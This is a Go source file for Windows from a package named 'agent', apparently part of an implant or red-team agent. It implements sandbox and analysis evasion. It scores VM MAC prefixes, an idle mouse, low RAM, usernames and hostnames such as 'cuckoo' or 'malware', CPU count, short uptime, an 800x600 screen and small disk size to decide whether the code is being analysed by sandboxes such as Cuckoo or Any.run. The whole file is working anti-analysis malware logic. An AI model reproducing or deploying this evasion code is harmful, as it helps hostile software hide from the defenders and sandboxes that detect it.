//go:build windows

package agent

import (
	"net"
	"os"
	"runtime"
	"strings"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	modKernel32          = windows.NewLazySystemDLL("kernel32.dll")
	modUser32sb          = windows.NewLazySystemDLL("user32.dll")
	procGlobalMemStat    = modKernel32.NewProc("GlobalMemoryStatusEx")
	procGetLastInput     = modUser32sb.NewProc("GetLastInputInfo")
	procGetTick64        = modKernel32.NewProc("GetTickCount64")
	procGetCursorPos     = modUser32sb.NewProc("GetCursorPos")
	procSleepSb          = modKernel32.NewProc("Sleep")
	procGetDiskFreeSpace = modKernel32.NewProc("GetDiskFreeSpaceExW")
	procGetSysMetrics    = modUser32sb.NewProc("GetSystemMetrics")
)

// memoryStatusEx mirrors the Windows MEMORYSTATUSEX struct.
type memoryStatusEx struct {
	dwLength                uint32
	dwMemoryLoad            uint32
	ullTotalPhys            uint64
	ullAvailPhys            uint64
	ullTotalPageFile        uint64
	ullAvailPageFile        uint64
	ullTotalVirtual         uint64
	ullAvailVirtual         uint64
	ullAvailExtendedVirtual uint64
}

type lastInputInfo struct {
	cbSize uint32
	dwTime uint32
}

// vmMACPrefixes lists MAC prefixes used exclusively by automated sandbox
// environments (Cuckoo, Any.run, etc.). Proxmox/QEMU (52:54:00), Hyper-V,
// Xen and bare-metal VMware ESXi are intentionally excluded — those are
// legitimate pentest targets, not sandboxes.
var vmMACPrefixes = [][3]byte{
	{0x00, 0x05, 0x69}, // VMware Workstation (desktop, likely sandbox)
	{0x00, 0x0C, 0x29}, // VMware Workstation (DHCP, likely sandbox)
	{0x08, 0x00, 0x27}, // VirtualBox (common sandbox platform)
	{0x00, 0x1C, 0x42}, // Parallels Desktop
}

// isVM returns true if any network interface has a MAC prefix belonging to a
// known virtualisation vendor.
func isVM() bool {
	ifaces, err := net.Interfaces()
	if err != nil {
		return false
	}
	for _, iface := range ifaces {
		mac := iface.HardwareAddr
		if len(mac) < 3 {
			continue
		}
		for _, p := range vmMACPrefixes {
			if mac[0] == p[0] && mac[1] == p[1] && mac[2] == p[2] {
				return true
			}
		}
	}
	return false
}

type cursorPoint struct{ X, Y int32 }

// checkMouseActivity samples the cursor position twice 500 ms apart.
// Returns true if the mouse did not move — a strong sandbox indicator.
func checkMouseActivity() bool {
	var p1, p2 cursorPoint
	procGetCursorPos.Call(uintptr(unsafe.Pointer(&p1)))
	procSleepSb.Call(500)
	procGetCursorPos.Call(uintptr(unsafe.Pointer(&p2)))
	return p1.X == p2.X && p1.Y == p2.Y
}

// isSandbox uses an accumulated scoring model: each indicator adds points,
// and the environment is treated as a sandbox when the total meets the
// threshold. No single weak signal causes a false positive.
func isSandbox() bool {
	const threshold = 3
	score := 0

	// ── RAM ─────────────────────────────────────────────────────────────────
	var ms memoryStatusEx
	ms.dwLength = uint32(unsafe.Sizeof(ms))
	procGlobalMemStat.Call(uintptr(unsafe.Pointer(&ms)))
	if ms.ullTotalPhys > 0 {
		if ms.ullTotalPhys < 512*1024*1024 {
			score += 3 // extremely rare on any real target
		} else if ms.ullTotalPhys < 2*1024*1024*1024 {
			score++
		}
	}

	// ── Sandbox usernames ────────────────────────────────────────────────────
	user := strings.ToLower(os.Getenv("USERNAME"))
	for _, n := range []string{
		"sandbox", "malware", "virus", "cuckoo", "analyst",
		"maltest", "vmuser", "wilbert", "klone",
	} {
		if user == n {
			score += 3
			break
		}
	}

	// ── Sandbox hostnames ────────────────────────────────────────────────────
	hostname, _ := os.Hostname()
	hn := strings.ToLower(hostname)
	for _, h := range []string{
		"sandbox", "cuckoo", "malware", "virus", "win7malware",
	} {
		if strings.Contains(hn, h) {
			score += 3
			break
		}
	}

	// ── MAC prefix from known sandbox-only vendors ───────────────────────────
	if isVM() {
		score++
	}

	// ── CPU cores < 2 ────────────────────────────────────────────────────────
	if runtime.NumCPU() < 2 {
		score++
	}

	// ── System uptime < 5 min (sandbox spun up just for this sample) ─────────
	if upMs, _, _ := procGetTick64.Call(); upMs > 0 && upMs < 5*60*1000 {
		score++
	}

	// ── Screen 800×600 (classic sandbox resolution) ──────────────────────────
	if cx, _, _ := procGetSysMetrics.Call(0); int(cx) == 800 {
		if cy, _, _ := procGetSysMetrics.Call(1); int(cy) == 600 {
			score += 2
		}
	}

	// ── Disk C: < 40 GB (sandboxes use minimal disk) ─────────────────────────
	cDrive := [4]uint16{'C', ':', '\\', 0}
	var totalBytes uint64
	procGetDiskFreeSpace.Call(
		uintptr(unsafe.Pointer(&cDrive[0])),
		0,
		uintptr(unsafe.Pointer(&totalBytes)),
		0,
	)
	if totalBytes > 0 && totalBytes < 40*1024*1024*1024 {
		score++
	}

	return score >= threshold
}
